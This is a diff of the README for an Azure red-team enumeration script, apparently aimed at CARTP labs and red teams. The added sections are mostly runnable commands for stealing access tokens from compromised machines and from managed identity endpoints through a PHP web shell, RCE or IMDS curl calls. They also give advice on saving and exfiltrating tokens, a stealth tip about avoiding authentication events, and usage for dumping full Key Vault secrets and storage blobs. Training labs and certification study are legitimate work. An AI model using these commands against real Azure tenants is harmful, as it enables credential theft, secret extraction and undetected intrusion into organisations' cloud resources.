@@ -19,6 +19,24 @@
 
 Some scripts to automate enumeration of Azure ARM resources using tokens or current logged user. Useful for **CARTP certification**, **Azure Red Team Labs from Altered Security** or **Red Teams**.
 
+### 🚀 **Quick Start - Authentication Cheat Sheet**
+
+| Method | Prompts? | Best For | Command |
+|--------|----------|----------|---------|
+| **🎯 Token (No Prompts)** | ❌ | **CTF/Automation** | `.\Enum-AzureARM.ps1 -AccessTokenARM $token -AccountId $user` |
+| **🔐 Service Principal (No Prompts)** | ❌ | **Red Team/Automation** | `.\Enum-AzureARM.ps1 -UseServicePrincipal -ApplicationId $id -ClientSecret $secret -TenantId $tenant` |
+| **👤 Current User (Interactive)** | ✅ | **Manual Testing** | `.\Enum-AzureARM.ps1 -UseCurrentUser` |
+
+**Get Tokens:**
+
+```powershell
+# Azure CLI ARM Token
+$armToken = (az account get-access-token --resource=https://management.azure.com/ | ConvertFrom-Json).accessToken
+
+# Azure CLI Graph Token  
+$graphToken = (az account get-access-token --resource=https://graph.microsoft.com --output json | ConvertFrom-Json).accessToken
+```
+
 Basically, if you're tired of enumerating resources using Powershell and AZ Cli, or you face a CTF or you simple want to see the different resources that can be accesed using a token without a lot of manual commands, you've come to the right place. These scripts will make you look smart at parties (the kind of parties where people discuss PowerShell... so, very exclusive parties).
 
 ## 🔥 The Star of the Show
@@ -30,8 +48,10 @@ This magnificent beast of a script will enumerate Azure resources faster than yo
 **What it does:**
 
 - 🕵️ **Finds ALL the things**: VMs, Storage Accounts, Key Vaults, Web Apps, Function Apps, and more
-- 🔐 **Extract Key Vault secrets** with **full values** (not truncated like other tools)
-- 💾 **Enhanced blob downloads** with 5-tier authentication system for maximum success
+- 🔐 **Extract Key Vault secrets** with **dedicated OAuth tokens** and **full values** (not truncated like other tools)
+- 💾 **Enhanced blob downloads** with OAuth-based enumeration, smart diagnostics, and 5-tier authentication system
+- 🔍 **Smart Storage enumeration** - lists containers even without Storage tokens, provides helpful guidance for blob access
+- 🛠️ **Advanced token diagnostics** - JWT analysis, scope validation, and comprehensive troubleshooting guidance
 - 👥 **Maps role assignments** like a social network stalker (with principal name resolution)
 - 📊 **Generates beautiful reports** that will make your boss think you're a wizard
 - 🎭 **Multiple authentication methods** including **advanced service principal support**
@@ -43,7 +63,17 @@ This magnificent beast of a script will enumerate Azure resources faster than yo
 
 **How to use it like a pro:**
 
-### 🔐 Authentication Methods
+### 🔐 Authentication Methods & Behavior
+
+> **⚠️ IMPORTANT**: As of the latest update, the script now implements **smart authentication behavior** - subscription selection is **only prompted when using `-UseCurrentUser`**. Token-based and service principal authentication proceed directly with available privileges.
+
+#### 🎯 **Authentication Behavior Summary**
+
+| Authentication Method | Subscription Selection | Behavior |
+|---------------------|----------------------|----------|
+| **Token-Based** (`-AccessTokenARM`/`-AccessTokenGraph`) | ❌ **No Prompts** | Proceeds directly with token privileges |
+| **Service Principal** (`-UseServicePrincipal`) | ❌ **No Prompts** | Uses service principal's available access |  
+| **Current User** (`-UseCurrentUser`) | ✅ **Interactive** | Prompts for subscription selection when multiple available |
 
 #### 1. **Current User Authentication** (The "I'm already logged in" approach)
 
@@ -60,9 +90,11 @@ Perfect for when you've already authenticated with Azure PowerShell or Azure CLI
 .\Enum-AzureARM.ps1 -UseCurrentUser -AllowNoSubscription
 ```
 
-#### 2. **Service Principal Authentication** 🚀 **[RECOMMENDED FOR CTF/RED TEAM]**
+**Behavior**: Interactive subscription selection menu appears when multiple subscriptions are available.
 
-The crown jewel of authentication methods. When you have service principal credentials, this is your best friend:
+#### 2. **Service Principal Authentication** 🚀 **[RECOMMENDED FOR CTF/RED TEAM - NO PROMPTS]**
+
+The crown jewel of authentication methods. When you have service principal credentials, this is your best friend. **Proceeds directly with enumeration - no subscription selection prompts!**
 
 ##### **Azure PowerShell Service Principal** (Enhanced Mode)
 
@@ -104,23 +136,40 @@ The crown jewel of authentication methods. When you have service principal crede
                     -TenantId "87654321-4321-4321-4321-cba987654321"
 ```
 
-#### 3. **Token-Based Authentication** (The "I have tokens and I'm not afraid to use them" approach)
+#### 3. **Token-Based Authentication** 🎯 **[NO PROMPTS - DIRECT ACCESS]**
 
-When you already have tokens from other sources:
+When you already have tokens from other sources. **The script automatically extracts tenant ID from JWT token claims and proceeds directly with enumeration - no subscription prompts!**
 
 ```powershell
-# ARM + Graph tokens (full access)
+# ARM + Graph tokens (full access) - uses first subscription  
 .\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccountId $userId
+
+# Enhanced enumeration with Storage and Key Vault tokens 🆕
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenStorage $storageToken -AccessTokenKeyVault $kvToken -AccountId $userId
+
+# Interactive subscription selection with tokens
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccountId $userId -ForceSubscriptionSelection
 
 # Just Graph enumeration
 .\Enum-AzureARM.ps1 -AccessTokenGraph $graphToken -GraphOnly
 
-# Just ARM enumeration
-.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccountId $userId
+# Just ARM enumeration with Storage enhancement
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenStorage $storageToken -AccountId $userId
+
+# Fully non-interactive (automation)
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccountId $userId -NoInteractiveAuth
 
 # Allow enumeration without subscription (Graph-only mode)
 .\Enum-AzureARM.ps1 -AccessTokenGraph $graphToken -AllowNoSubscription
 ```
+
+**Behavior:**
+
+- ✅ **No subscription prompts by default** - proceeds directly with token privileges  
+- 🔍 **JWT parsing** - extracts `tid` (tenant ID) claim for validation
+- 🎯 **Direct access** - uses whatever subscriptions/resources the token can access
+- ⚡ **Automatic mode** - perfect for automation and CTF scenarios
+- 🎮 **Optional interactive selection** - use `-ForceSubscriptionSelection` to choose different subscriptions
 
 ### 🎯 **Real-World Scenarios**
 
@@ -160,6 +209,198 @@ When you already have tokens from other sources:
 # When you only need Azure AD enumeration
 .\Enum-AzureARM.ps1 -AccessTokenGraph $discoveredGraphToken -GraphOnly -Verbose
 ```
+
+---
+
+## 🎫 **Token Acquisition Methods** 🔐 **[CTF/RED TEAM ESSENTIAL]**
+
+### 🚀 **Azure CLI Token Extraction**
+
+When you have access to Azure CLI (perfect for post-compromise scenarios):
+
+#### **ARM Management Token**
+
+```powershell
+# PowerShell - ARM token for resource management
+$armToken = (az account get-access-token --resource=https://management.azure.com/ | ConvertFrom-Json).accessToken
+
+# Use the token
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccountId "user@target.com"
+```
+
+#### **Microsoft Graph Token**
+
+```powershell
+# PowerShell - Graph token for Azure AD enumeration  
+$graphToken = (az account get-access-token --resource=https://graph.microsoft.com --output json | ConvertFrom-Json).accessToken
+
+# Use the token
+.\Enum-AzureARM.ps1 -AccessTokenGraph $graphToken -GraphOnly
+```
+
+#### **Combined Token Acquisition**
+
+```powershell
+# Get all tokens for maximum access 🆕
+$armToken = (az account get-access-token --resource=https://management.azure.com/ | ConvertFrom-Json).accessToken
+$graphToken = (az account get-access-token --resource=https://graph.microsoft.com --output json | ConvertFrom-Json).accessToken
+$storageToken = (az account get-access-token --resource=https://storage.azure.com/ | ConvertFrom-Json).accessToken
+$kvToken = (az account get-access-token --resource=https://vault.azure.net/ | ConvertFrom-Json).accessToken
+$userId = (az account show --query user.name -o tsv)
+
+# Full enumeration with all tokens for maximum capabilities
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccessTokenStorage $storageToken -AccessTokenKeyVault $kvToken -AccountId $userId -Verbose
+```
+
+#### **🆕 Resource-Specific Token Acquisition**
+
+```powershell
+# Storage token for enhanced blob enumeration
+$storageToken = (az account get-access-token --resource=https://storage.azure.com/ | ConvertFrom-Json).accessToken
+
+# Key Vault token for enhanced secret access
+$kvToken = (az account get-access-token --resource=https://vault.azure.net/ | ConvertFrom-Json).accessToken
+
+# Use with existing ARM token for enhanced storage access
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenStorage $storageToken -AccountId $userId
+
+# Use with Graph token for enhanced Key Vault access
+.\Enum-AzureARM.ps1 -AccessTokenGraph $graphToken -AccessTokenKeyVault $kvToken
+```
+
+### 🕵️ **Azure PowerShell Token Extraction**
+
+When Azure PowerShell is available:
+
+```powershell
+# Get ARM token from current Azure PowerShell context
+$context = Get-AzContext
+$armToken = $context.TokenCache.ReadItems() | Where-Object { $_.Resource -eq "https://management.azure.com/" } | Select-Object -First 1 -ExpandProperty AccessToken
+
+# Alternative method using Get-AzAccessToken (Az.Accounts 2.2.0+)
+$armToken = (Get-AzAccessToken).Token
+$graphToken = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
+
+# Use extracted tokens
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccountId (Get-AzContext).Account.Id
+```
+
+### 🎭 **Managed Identity Exploitation** 🔥 **[CTF FAVORITE]**
+
+When you compromise a resource with managed identity (VMs, App Services, Function Apps, etc.):
+
+#### **Method 1: Direct cURL (Linux/WSL)**
+
+```bash
+# ARM token via managed identity
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
+     -H "secret:$IDENTITY_HEADER"
+
+# Graph token via managed identity  
+curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com&api-version=2017-09-01" \
+     -H "secret:$IDENTITY_HEADER"
+```
+
+#### **Method 2: PowerShell via Web Shell/RCE**
+
+```powershell
+# Get ARM token via managed identity endpoint
+$response = Invoke-RestMethod -Uri "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -Headers @{secret="$env:IDENTITY_HEADER"}
+$armToken = $response.access_token
+
+# Get Graph token  
+$graphResponse = Invoke-RestMethod -Uri "$env:IDENTITY_ENDPOINT?resource=https://graph.microsoft.com&api-version=2017-09-01" -Headers @{secret="$env:IDENTITY_HEADER"}  
+$graphToken = $graphResponse.access_token
+
+# Use tokens (save to file or exfiltrate)
+"ARM Token: $armToken" | Out-File tokens.txt
+"Graph Token: $graphToken" | Add-Content tokens.txt
+```
+
+#### **Method 3: Web Application Exploitation (PHP)**
+
+Perfect for when you have RCE on a web application running on App Service:
+
+```php
+<?php
+// Exploit managed identity via PHP web shell
+system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"');
+?>
+```
+
+#### **Method 4: IMDS Metadata Service (Azure VMs)**
+
+For compromised Azure VMs (when IDENTITY_ENDPOINT isn't available):
+
+```bash
+# ARM token from Azure VM metadata service
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Graph token from Azure VM metadata service
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
+```
+
+### 🔧 **Token Validation & Usage**
+
+Once you have tokens, validate and use them:
+
+```powershell
+# Quick token validation (check if it works)
+$headers = @{ Authorization = "Bearer $armToken" }
+$test = Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2022-12-01" -Headers $headers
+
+# Check token claims (decode JWT)
+$tokenParts = $armToken.Split('.')
+$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenParts[1]))
+$claims = $payload | ConvertFrom-Json
+Write-Host "Tenant ID: $($claims.tid)"
+Write-Host "App ID: $($claims.appid)"  
+Write-Host "UPN: $($claims.upn)"
+
+# Use with enumeration script
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccountId $claims.upn -Verbose
+```
+
+### 🎯 **CTF/Red Team Token Scenarios**
+
+#### **Scenario 1: Compromised Developer Machine**
+
+```powershell
+# Developer has Azure CLI authenticated
+$armToken = (az account get-access-token --resource=https://management.azure.com/ | ConvertFrom-Json).accessToken
+$graphToken = (az account get-access-token --resource=https://graph.microsoft.com --output json | ConvertFrom-Json).accessToken
+
+# Maximum enumeration
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenGraph $graphToken -AccountId "dev@company.com" -Verbose
+```
+
+#### **Scenario 2: Compromised Web Application with Managed Identity**
+
+```bash
+# From compromised web shell or RCE
+export TOKENS=$(curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER")
+echo $TOKENS > /tmp/arm_token.json
+
+# Extract and use token (transfer to attack machine)
+```
+
+#### **Scenario 3: Found Tokens in Configuration/Environment Variables**
+
+```powershell
+# Found in config files, environment variables, or source code
+$foundArmToken = "eyJ0eXAiOiJKV1QiLCJhbGc..."
+$foundGraphToken = "eyJ0eXAiOiJKV1QiLCJhbGc..."
+
+# Direct enumeration - no subscription prompts!
+.\Enum-AzureARM.ps1 -AccessTokenARM $foundArmToken -AccessTokenGraph $foundGraphToken -AccountId "service@target.com"
+```
+
+### ⚠️ **Token Security Notes**
+
+- **Tokens expire** - typically 1 hour for user tokens, varies for service principals
+- **Scope matters** - ensure tokens have appropriate resource audience (`https://management.azure.com/` for ARM)
+- **Refresh tokens** - if available, can be used to get new access tokens
+- **Stealth tip** - token-based enumeration doesn't trigger new authentication events
 
 ---
 
@@ -268,19 +509,26 @@ If automatic token acquisition fails, the script provides:
 
 ### 📊 **Enhanced Enumeration Capabilities**
 
-#### **🔐 Key Vault Deep Dive**
+#### **🔐 Key Vault Deep Dive** 🆕 **ENHANCED**
 
 - Lists all Key Vaults in accessible subscriptions
+- **Dedicated Key Vault OAuth token support** for enhanced secret access
+- **Priority token usage** - uses `-AccessTokenKeyVault` as highest priority method
 - Extracts secret names and **full secret values** (not truncated)
-- Handles both certificate and key secrets
-- Proper error handling for permission issues
+- Handles both certificate and key secrets with improved authentication
+- **Multiple token fallback** - Key Vault OAuth → CLI-acquired tokens → ARM → Graph
+- Enhanced error handling with specific permission guidance
 
-#### **💾 Storage Account Comprehensive Scanning**
+#### **💾 Storage Account Comprehensive Scanning** 🆕 **ENHANCED**
 
-- Lists all storage accounts and containers
-- **Attempts to download all accessible blobs**
-- Multiple authentication methods for maximum success
-- Detailed logging of download attempts and failures
+- Lists all storage accounts and containers (even without Storage token)
+- **OAuth-based blob enumeration** with dedicated Storage tokens
+- **Smart container enumeration** - lists containers without blob access, provides guidance
+- **Cross-method verification** - validates OAuth results with alternative methods
+- **Enhanced progress tracking** with real-time container and blob processing feedback
+- **Comprehensive diagnostics** - JWT token analysis, scope validation, troubleshooting tips
+- **Multiple authentication fallback** - Storage OAuth → Account Key → Azure CLI → PowerShell
+- Detailed logging of enumeration attempts and specific failure reasons
 
 #### **👥 Role Assignment Analysis**
 
@@ -299,14 +547,22 @@ If automatic token acquisition fails, the script provides:
                     -TenantId "target-tenant" `
                     -Verbose
 
+# Alternative: Manual token acquisition for maximum control 🆕
+$armToken = (az account get-access-token --resource=https://management.azure.com/ | ConvertFrom-Json).accessToken
+$storageToken = (az account get-access-token --resource=https://storage.azure.com/ | ConvertFrom-Json).accessToken
+$kvToken = (az account get-access-token --resource=https://vault.azure.net/ | ConvertFrom-Json).accessToken
+
+.\Enum-AzureARM.ps1 -AccessTokenARM $armToken -AccessTokenStorage $storageToken -AccessTokenKeyVault $kvToken -AccountId "target@company.com" -Verbose
+
 # What you get:
-# ✅ Complete resource inventory
-# ✅ All downloadable storage blobs  
-# ✅ Key Vault secrets (full values)
-# ✅ Role assignments and permissions
+# ✅ Complete resource inventory with enhanced authentication
+# ✅ OAuth-based blob enumeration with comprehensive diagnostics
+# ✅ Enhanced Key Vault secret access with dedicated tokens
+# ✅ Smart container enumeration (lists containers even without blob access)
+# ✅ Cross-method verification for maximum data retrieval
+# ✅ Role assignments and permissions analysis
 # ✅ Azure AD user/group enumeration
-# ✅ Cross-resource correlation
-# ✅ Actionable next steps in output
+# ✅ Detailed troubleshooting guidance and next steps
 ```
 
 ### 🔧 **Troubleshooting Made Easy**
@@ -460,7 +716,35 @@ Want to make these scripts even better? Here's how not to mess things up:
 
 ## 📈 Version History (The Journey)
 
-### Version 2.1 - "The Smart Subscription Update" ⭐ **LATEST**
+### Version 2.4 - "The Enhanced Storage & Diagnostics Update" ⭐ **LATEST**
+
+- **🔐 Storage & Key Vault Token Support** - new `-AccessTokenStorage` and `-AccessTokenKeyVault` parameters
+- **🔍 Enhanced Storage OAuth Authentication** - OAuth-based blob enumeration with comprehensive error handling
+- **📊 Smart Container Enumeration** - lists containers without Storage token, with helpful guidance for blob access
+- **🛠️ Advanced Token Diagnostics** - JWT token analysis, scope validation, and troubleshooting guidance
+- **⚡ Cross-Method Verification** - validates OAuth results with alternative authentication methods when available
+- **🎯 Comprehensive Progress Tracking** - detailed progress indicators for storage account processing
+- **💡 Intelligent User Guidance** - proactive tips and troubleshooting suggestions throughout enumeration
+
+### Version 2.3 - "The Token Subscription Selection Update"
+
+- **🎮 Token-Based Subscription Selection** - new `-ForceSubscriptionSelection` parameter
+- **🔧 Enhanced JWT Token Parsing** - fixed URL-safe Base64 decoding for Graph tokens  
+- **⚡ Flexible Authentication Options** - choose between automatic and interactive modes
+- **🎯 Improved User Experience** - clear control over subscription selection behavior
+- **📋 Multiple Subscription Support** - select specific subscriptions even with tokens
+- **🛠️ Better Error Handling** - robust JWT parsing with fallback mechanisms
+
+### Version 2.2 - "The Smart Authentication Update"
+
+- **🎯 Smart Authentication Behavior** - subscription selection only for `-UseCurrentUser`
+- **🔐 JWT Token Parsing** - automatic extraction of `tid` (tenant ID) claims from tokens
+- **⚡ No-Prompt Automation** - token and service principal auth proceed directly
+- **🎫 Comprehensive Token Acquisition Guide** - Azure CLI, PowerShell, and exploitation methods
+- **🕵️ Managed Identity Exploitation** - detailed methods for post-compromise scenarios
+- **📚 Enhanced Documentation** - complete authentication behavior reference
+
+### Version 2.1 - "The Smart Subscription Update"
 
 - **🛡️ Smart subscription management** with test subscription detection
 - **🎮 Interactive subscription selection** menu with timeout handling
@@ -500,14 +784,30 @@ For more details read the [LICENSE](LICENSE) file
 
 ### 🔥 Enum-AzureARM.ps1 - Quick Commands
 
-| Scenario | Command | Why Use This |
-|----------|---------|--------------|
-| **Current User** | `.\Enum-AzureARM.ps1 -UseCurrentUser` | Already logged in with Az/CLI |
-| **🚀 CTF/Red Team** | `.\Enum-AzureARM.ps1 -UseServicePrincipal -ApplicationId '<ID>' -ClientSecret '<SECRET>' -TenantId '<TENANT>'` | **Maximum capabilities + auto tokens** |
-| **Standard Automation** | `.\Enum-AzureARM.ps1 -ServicePrincipalId '<ID>' -ServicePrincipalSecret '<SECRET>' -TenantId '<TENANT>'` | Azure CLI backend |
-| **Token Only** | `.\Enum-AzureARM.ps1 -AccessTokenARM '<TOKEN>' -AccountId '<ID>'` | Have tokens from other source |
-| **Graph Only** | `.\Enum-AzureARM.ps1 -AccessTokenGraph '<TOKEN>' -GraphOnly` | Azure AD enumeration only |
-| **⭐ No Subscription** | `.\Enum-AzureARM.ps1 -UseCurrentUser -AllowNoSubscription` | **Graph-only + smart subscription handling** |
+| Scenario | Command | Prompts | Why Use This |
+|----------|---------|---------|--------------|
+| **Current User** | `.\Enum-AzureARM.ps1 -UseCurrentUser` | ✅ **Interactive** | Already logged in with Az/CLI |
+| **🚀 CTF/Red Team** | `.\Enum-AzureARM.ps1 -UseServicePrincipal -ApplicationId '<ID>' -ClientSecret '<SECRET>' -TenantId '<TENANT>'` | ❌ **No Prompts** | **Maximum capabilities + auto tokens** |
+| **Standard Automation** | `.\Enum-AzureARM.ps1 -ServicePrincipalId '<ID>' -ServicePrincipalSecret '<SECRET>' -TenantId '<TENANT>'` | ❌ **No Prompts** | Azure CLI backend |
+| **🎯 Token ARM+Graph** | `.\Enum-AzureARM.ps1 -AccessTokenARM '<TOKEN>' -AccessTokenGraph '<TOKEN>' -AccountId '<ID>'` | ❌ **No Prompts** | Have tokens from exploitation |
+| **🆕 Token Full Suite** | `.\Enum-AzureARM.ps1 -AccessTokenARM '<ARM>' -AccessTokenStorage '<STORAGE>' -AccessTokenKeyVault '<KV>' -AccountId '<ID>'` | ❌ **No Prompts** | **Maximum capabilities with all tokens** |
+| **🎮 Token + Selection** | `.\Enum-AzureARM.ps1 -AccessTokenARM '<TOKEN>' -AccessTokenGraph '<TOKEN>' -AccountId '<ID>' -ForceSubscriptionSelection` | ✅ **Interactive** | Choose subscription with tokens |  
+| **Token ARM + Storage** | `.\Enum-AzureARM.ps1 -AccessTokenARM '<TOKEN>' -AccessTokenStorage '<STORAGE>' -AccountId '<ID>'` | ❌ **No Prompts** | Enhanced storage enumeration |
+| **Token Graph + KV** | `.\Enum-AzureARM.ps1 -AccessTokenGraph '<TOKEN>' -AccessTokenKeyVault '<KV>'` | ❌ **No Prompts** | Enhanced Key Vault access |
+| **Graph Only** | `.\Enum-AzureARM.ps1 -AccessTokenGraph '<TOKEN>' -GraphOnly` | ❌ **No Prompts** | Azure AD enumeration only |
+| **⭐ No Subscription** | `.\Enum-AzureARM.ps1 -UseCurrentUser -AllowNoSubscription` | ✅ **Interactive** | **Graph-only + smart subscription handling** |
+
+### 🎫 **Quick Token Acquisition**
+
+| Method | Command | Use Case |
+|--------|---------|----------|
+| **Azure CLI ARM** | `$armToken = (az account get-access-token --resource=https://management.azure.com/ \| ConvertFrom-Json).accessToken` | Post-compromise with Azure CLI |
+| **Azure CLI Graph** | `$graphToken = (az account get-access-token --resource=https://graph.microsoft.com --output json \| ConvertFrom-Json).accessToken` | Azure AD enumeration token |
+| **🆕 Azure CLI Storage** | `$storageToken = (az account get-access-token --resource=https://storage.azure.com/ \| ConvertFrom-Json).accessToken` | Enhanced blob enumeration |
+| **🆕 Azure CLI Key Vault** | `$kvToken = (az account get-access-token --resource=https://vault.azure.net/ \| ConvertFrom-Json).accessToken` | Enhanced secret access |
+| **Managed Identity ARM** | `curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"` | Compromised Azure resource |
+| **🆕 Managed Identity Storage** | `curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"` | Compromised resource with Storage access |
+| **Web App Exploit** | `<?php system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "secret:$IDENTITY_HEADER"'); ?>` | RCE on App Service with managed identity |
 
 **🎯 Pro Tips:**
 
